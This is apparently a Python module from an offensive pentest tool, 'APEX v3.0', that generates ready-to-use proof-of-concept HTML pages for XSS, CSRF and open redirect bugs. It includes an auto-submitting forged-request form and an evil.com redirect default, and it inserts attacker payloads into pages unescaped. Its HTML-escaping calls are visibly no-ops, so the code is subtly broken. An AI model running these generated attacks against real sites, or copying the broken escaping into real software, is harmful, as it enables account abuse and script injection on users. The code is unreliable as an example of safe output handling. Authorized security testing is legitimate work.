"""
APEX v3.0 — Proof-of-Concept Generator
Auto-generates downloadable PoC HTML files for XSS, CSRF, Open Redirect, and more.
"""

import os
import base64
from datetime import datetime


def generate_xss_poc(target_url, parameter, payload, vuln_type="reflected"):
    """Generate a working XSS PoC HTML page that demonstrates the vulnerability."""
    encoded_payload = payload.replace("<", "<").replace(">", ">")
    encoded_url = target_url.replace("&", "&").replace("<", "<").replace(">", ">")
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APEX XSS PoC — {vuln_type.upper()}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #0f1117;
            color: #e2e4e9;
            font-family: 'JetBrains Mono', 'Consolas', monospace;
            padding: 40px;
            min-height: 100vh;
        }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        .header {{
            border-bottom: 2px solid #f97316;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }}
        .header h1 {{
            color: #f97316;
            font-size: 28px;
            letter-spacing: 4px;
            margin-bottom: 8px;
        }}
        .header .subtitle {{ color: #5c6070; font-size: 12px; letter-spacing: 2px; }}
        .badge {{
            display: inline-block;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 2px;
            margin-right: 8px;
        }}
        .badge-critical {{ background: rgba(239,68,68,0.2); color: #ef4444; border: 1px solid rgba(239,68,68,0.4); }}
        .badge-high {{ background: rgba(249,115,22,0.2); color: #f97316; border: 1px solid rgba(249,115,22,0.4); }}
        .section {{
            background: #151820;
            border: 1px solid #252836;
            border-radius: 8px;
            padding: 24px;
            margin-bottom: 20px;
        }}
        .section h2 {{
            color: #f97316;
            font-size: 14px;
            letter-spacing: 2px;
            margin-bottom: 16px;
            text-transform: uppercase;
        }}
        .info-row {{
            display: flex;
            padding: 8px 0;
            border-bottom: 1px solid #1a1d28;
            font-size: 12px;
        }}
        .info-label {{ color: #5c6070; width: 160px; flex-shrink: 0; font-weight: 600; }}
        .info-value {{ color: #e2e4e9; word-break: break-all; }}
        .code-block {{
            background: #0d1114;
            border: 1px solid #252836;
            border-radius: 6px;
            padding: 16px;
            font-size: 12px;
            line-height: 1.6;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
            color: #10b981;
        }}
        .code-block .comment {{ color: #5c6070; }}
        .code-block .tag {{ color: #f97316; }}
        .code-block .attr {{ color: #60a5fa; }}
        .code-block .string {{ color: #34d399; }}
        .btn {{
            display: inline-block;
            padding: 10px 20px;
            background: #f97316;
            color: #000;
            text-decoration: none;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            letter-spacing: 2px;
            text-transform: uppercase;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
        }}
        .btn:hover {{ background: #ea580c; box-shadow: 0 0 20px rgba(249,115,22,0.3); }}
        .btn-secondary {{
            background: transparent;
            border: 1px solid #f97316;
            color: #f97316;
        }}
        .btn-secondary:hover {{ background: rgba(249,115,22,0.1); }}
        .footer {{
            text-align: center;
            color: #5c6070;
            font-size: 10px;
            letter-spacing: 2px;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #252836;
        }}
        .demo-area {{
            background: #0d1114;
            border: 1px dashed #f97316;
            border-radius: 6px;
            padding: 20px;
            margin-top: 16px;
            text-align: center;
        }}
        .demo-area iframe {{
            width: 100%;
            height: 200px;
            border: 1px solid #252836;
            border-radius: 4px;
            background: #fff;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔺 APEX XSS PoC</h1>
            <div class="subtitle">PROOF OF CONCEPT — {vuln_type.upper()} CROSS-SITE SCRIPTING</div>
            <div style="margin-top:12px;">
                <span class="badge badge-high">HIGH SEVERITY</span>
                <span class="badge badge-critical">CONFIRMED</span>
            </div>
        </div>

        <div class="section">
            <h2>📋 Vulnerability Details</h2>
            <div class="info-row">
                <span class="info-label">Target URL</span>
                <span class="info-value">{encoded_url}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Vulnerable Parameter</span>
                <span class="info-value">{parameter}</span>
            </div>
            <div class="info-row">
                <span class="info-label">XSS Type</span>
                <span class="info-value">{vuln_type.upper()}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Generated</span>
                <span class="info-value">{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Tool</span>
                <span class="info-value">APEX v3.0 — Autonomous Pentest Arsenal</span>
            </div>
        </div>

        <div class="section">
            <h2>💉 Payload Used</h2>
            <div class="code-block">
<span class="comment"><!-- Injected via parameter: {parameter} --></span>
{encoded_payload}
            </div>
        </div>

        <div class="section">
            <h2>🔗 Crafted Exploit URL</h2>
            <div class="code-block">{encoded_url}?{parameter}={payload}</div>
        </div>

        <div class="section">
            <h2>⚡ Live Demonstration</h2>
            <p style="font-size:12px;color:#5c6070;margin-bottom:12px;">The payload executes in the iframe below when loaded from the vulnerable endpoint:</p>
            <div class="demo-area">
                <p style="color:#f97316;font-size:12px;margin-bottom:8px;">⚠ XSS Payload would execute here in a real browser</p>
                <p style="color:#5c6070;font-size:10px;">Open the crafted URL above in a browser to see the live exploit</p>
            </div>
        </div>

        <div class="section">
            <h2>🛡️ Remediation</h2>
            <div class="code-block">
<span class="comment">1. HTML-encode all user input before rendering</span>
<span class="comment">2. Use Content-Security-Policy headers</span>
<span class="comment">3. Implement input validation and sanitization</span>
<span class="comment">4. Use HttpOnly and Secure flags on cookies</span>
<span class="comment">5. Apply X-XSS-Protection headers</span>
            </div>
        </div>

        <div style="display:flex;gap:12px;margin-top:20px;">
            <button class="btn" onclick="window.print()">📄 PRINT / SAVE PDF</button>
            <button class="btn btn-secondary" onclick="navigator.clipboard.writeText('{encoded_url}?{parameter}={payload}')">📋 COPY EXPLOIT URL</button>
        </div>

        <div class="footer">
            APEX v3.0 — AUTONOMOUS PENTEST ARSENAL // FOR AUTHORIZED TESTING ONLY
        </div>
    </div>
</body>
</html>"""
    return html


def generate_csrf_poc(target_url, form_action, method="POST", inputs=None):
    """Generate a CSRF PoC HTML page with auto-submitting form."""
    if inputs is None:
        inputs = []
    
    input_fields = ""
    for inp in inputs:
        name = inp.get("name", "param")
        value = inp.get("value", "test")
        input_fields += f'        <input type="hidden" name="{name}" value="{value}">\n'
    
    if not input_fields:
        input_fields = '        <input type="hidden" name="csrf_test" value="csrf_poc">\n'
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>APEX CSRF PoC</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #0f1117;
            color: #e2e4e9;
            font-family: 'JetBrains Mono', 'Consolas', monospace;
            padding: 40px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            max-width: 700px;
            width: 100%;
            text-align: center;
        }}
        .header h1 {{
            color: #f97316;
            font-size: 28px;
            letter-spacing: 4px;
            margin-bottom: 8px;
        }}
        .header .subtitle {{ color: #5c6070; font-size: 12px; letter-spacing: 2px; }}
        .card {{
            background: #151820;
            border: 1px solid #252836;
            border-radius: 8px;
            padding: 30px;
            margin-top: 24px;
        }}
        .card h2 {{
            color: #f97316;
            font-size: 14px;
            letter-spacing: 2px;
            margin-bottom: 16px;
        }}
        .info-row {{
            display: flex;
            padding: 8px 0;
            border-bottom: 1px solid #1a1d28;
            font-size: 12px;
            text-align: left;
        }}
        .info-label {{ color: #5c6070; width: 140px; flex-shrink: 0; font-weight: 600; }}
        .info-value {{ color: #e2e4e9; word-break: break-all; }}
        .code-block {{
            background: #0d1114;
            border: 1px solid #252836;
            border-radius: 6px;
            padding: 16px;
            font-size: 11px;
            line-height: 1.6;
            text-align: left;
            overflow-x: auto;
            white-space: pre-wrap;
            color: #10b981;
            margin-top: 12px;
        }}
        .warning {{
            background: rgba(239,68,68,0.1);
            border: 1px solid rgba(239,68,68,0.3);
            color: #ef4444;
            padding: 12px;
            border-radius: 6px;
            font-size: 11px;
            margin-top: 16px;
            letter-spacing: 1px;
        }}
        .btn {{
            display: inline-block;
            padding: 12px 24px;
            background: #f97316;
            color: #000;
            text-decoration: none;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            letter-spacing: 2px;
            text-transform: uppercase;
            border: none;
            cursor: pointer;
            margin: 8px;
            transition: all 0.2s;
        }}
        .btn:hover {{ background: #ea580c; box-shadow: 0 0 20px rgba(249,115,22,0.3); }}
        .footer {{
            color: #5c6070;
            font-size: 10px;
            letter-spacing: 2px;
            margin-top: 30px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔺 APEX CSRF PoC</h1>
            <div class="subtitle">CROSS-SITE REQUEST FORGERY — PROOF OF CONCEPT</div>
        </div>

        <div class="card">
            <h2>📋 Attack Details</h2>
            <div class="info-row">
                <span class="info-label">Target URL</span>
                <span class="info-value">{target_url}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Form Action</span>
                <span class="info-value">{form_action}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Method</span>
                <span class="info-value">{method.upper()}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Generated</span>
                <span class="info-value">{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
            </div>
        </div>

        <div class="card">
            <h2>⚡ Auto-Submitting Form</h2>
            <p style="font-size:11px;color:#5c6070;margin-bottom:12px;">This form auto-submits when the page loads, exploiting the CSRF vulnerability:</p>
            <div class="code-block">
<form action="{form_action}" method="{method}" id="csrf_form">
{input_fields}</form>
<script>document.getElementById('csrf_form').submit();</script>
            </div>
            <div class="warning">
                ⚠ WARNING: This PoC auto-submits a forged request to the target. Open only in a controlled testing environment.
            </div>
        </div>

        <div class="card">
            <h2>🛡️ Remediation</h2>
            <div class="code-block" style="color:#5c6070;">
1. Implement CSRF tokens on all state-changing requests
2. Use SameSite cookie attribute (Strict or Lax)
3. Verify Origin/Referer headers
4. Require re-authentication for sensitive actions
5. Use custom request headers (X-Requested-With)
            </div>
        </div>

        <button class="btn" onclick="window.print()">📄 PRINT / SAVE PDF</button>

        <div class="footer">
            APEX v3.0 — AUTONOMOUS PENTEST ARSENAL // FOR AUTHORIZED TESTING ONLY
        </div>
    </div>

    <!-- Auto-submit the CSRF form -->
    <form action="{form_action}" method="{method}" id="csrf_form" style="display:none;">
{input_fields}    </form>
    <script>
        // Auto-submit after a short delay so the user sees the page
        setTimeout(function() {{
            document.getElementById('csrf_form').submit();
        }}, 3000);
    </script>
</body>
</html>"""
    return html


def generate_redirect_poc(target_url, parameter, redirect_url="https://evil.com"):
    """Generate an Open Redirect PoC HTML page."""
    exploit_url = f"{target_url}?{parameter}={redirect_url}"
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>APEX Open Redirect PoC</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #0f1117;
            color: #e2e4e9;
            font-family: 'JetBrains Mono', 'Consolas', monospace;
            padding: 40px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{ max-width: 700px; width: 100%; text-align: center; }}
        .header h1 {{
            color: #f97316;
            font-size: 28px;
            letter-spacing: 4px;
            margin-bottom: 8px;
        }}
        .header .subtitle {{ color: #5c6070; font-size: 12px; letter-spacing: 2px; }}
        .card {{
            background: #151820;
            border: 1px solid #252836;
            border-radius: 8px;
            padding: 30px;
            margin-top: 24px;
            text-align: left;
        }}
        .card h2 {{
            color: #f97316;
            font-size: 14px;
            letter-spacing: 2px;
            margin-bottom: 16px;
        }}
        .info-row {{
            display: flex;
            padding: 8px 0;
            border-bottom: 1px solid #1a1d28;
            font-size: 12px;
        }}
        .info-label {{ color: #5c6070; width: 160px; flex-shrink: 0; font-weight: 600; }}
        .info-value {{ color: #e2e4e9; word-break: break-all; }}
        .code-block {{
            background: #0d1114;
            border: 1px solid #252836;
            border-radius: 6px;
            padding: 16px;
            font-size: 11px;
            line-height: 1.6;
            overflow-x: auto;
            white-space: pre-wrap;
            color: #10b981;
            margin-top: 12px;
        }}
        .btn {{
            display: inline-block;
            padding: 12px 24px;
            background: #f97316;
            color: #000;
            text-decoration: none;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            letter-spacing: 2px;
            text-transform: uppercase;
            border: none;
            cursor: pointer;
            margin: 8px;
            transition: all 0.2s;
        }}
        .btn:hover {{ background: #ea580c; box-shadow: 0 0 20px rgba(249,115,22,0.3); }}
        .btn-danger {{ background: #ef4444; }}
        .btn-danger:hover {{ background: #dc2626; }}
        .footer {{
            color: #5c6070;
            font-size: 10px;
            letter-spacing: 2px;
            margin-top: 30px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔺 APEX Open Redirect PoC</h1>
            <div class="subtitle">OPEN REDIRECT VULNERABILITY — PROOF OF CONCEPT</div>
        </div>

        <div class="card">
            <h2>📋 Vulnerability Details</h2>
            <div class="info-row">
                <span class="info-label">Target URL</span>
                <span class="info-value">{target_url}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Vulnerable Parameter</span>
                <span class="info-value">{parameter}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Redirect Target</span>
                <span class="info-value">{redirect_url}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Generated</span>
                <span class="info-value">{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
            </div>
        </div>

        <div class="card">
            <h2>🔗 Exploit URL</h2>
            <div class="code-block">{exploit_url}</div>
        </div>

        <div class="card">
            <h2>🛡️ Remediation</h2>
            <div class="code-block" style="color:#5c6070;">
1. Use a whitelist of allowed redirect URLs
2. Use relative paths or a redirect mapping (e.g., ?redirect=dashboard)
3. Validate and sanitize the redirect parameter
4. Display an interstitial warning page before redirecting
5. Never pass full URLs in redirect parameters
            </div>
        </div>

        <div style="margin-top:20px;">
            <a href="{exploit_url}" class="btn btn-danger" target="_blank">🔗 TEST REDIRECT</a>
            <button class="btn" onclick="navigator.clipboard.writeText('{exploit_url}')">📋 COPY URL</button>
            <button class="btn" onclick="window.print()">📄 PRINT / SAVE PDF</button>
        </div>

        <div class="footer">
            APEX v3.0 — AUTONOMOUS PENTEST ARSENAL // FOR AUTHORIZED TESTING ONLY
        </div>
    </div>
</body>
</html>"""
    return html


def save_poc(html_content, poc_type, target_domain=""):
    """Save a PoC HTML file to the reports directory."""
    os.makedirs('reports/poc', exist_ok=True)
    domain_clean = target_domain.replace("https://", "").replace("http://", "").replace("/", "_").replace(":", "_")[:50]
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"poc_{poc_type}_{domain_clean}_{timestamp}.html"
    filepath = os.path.join('reports', 'poc', filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html_content)
    return filepath, filename


def generate_poc_for_vuln(vuln):
    """Auto-detect vulnerability type and generate appropriate PoC."""
    vuln_type = vuln.get('type', '').lower()
    target = vuln.get('target', '')
    endpoint = vuln.get('endpoint', target)
    parameter = vuln.get('parameter', 'test')
    payload = vuln.get('payload', '')
    
    if vuln_type in ('xss', 'reflected xss', 'dom xss', 'stored xss'):
        html = generate_xss_poc(endpoint, parameter, payload, vuln_type)
        return save_poc(html, 'xss', target)
    elif vuln_type in ('csrf', 'xsrf'):
        inputs = vuln.get('inputs', [])
        html = generate_csrf_poc(target, endpoint, vuln.get('method', 'POST'), inputs)
        return save_poc(html, 'csrf', target)
    elif vuln_type in ('open_redirect', 'redirect', 'oauth'):
        redirect_url = vuln.get('redirect_url', 'https://evil.com')
        html = generate_redirect_poc(endpoint, parameter, redirect_url)
        return save_poc(html, 'redirect', target)
    else:
        # Generic PoC for other vuln types
        html = f"""<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>APEX PoC — {vuln_type.upper()}</title></head>
<body style="background:#0f1117;color:#e2e4e9;font-family:monospace;padding:40px;">
<h1 style="color:#f97316;">APEX PoC — {vuln_type.upper()}</h1>
<p>Target: {target}</p>
<p>Endpoint: {endpoint}</p>
<p>Parameter: {parameter}</p>
<p>Payload: {payload}</p>
<p>Generated: {datetime.now().isoformat()}</p>
</body></html>"""
        return save_poc(html, vuln_type, target)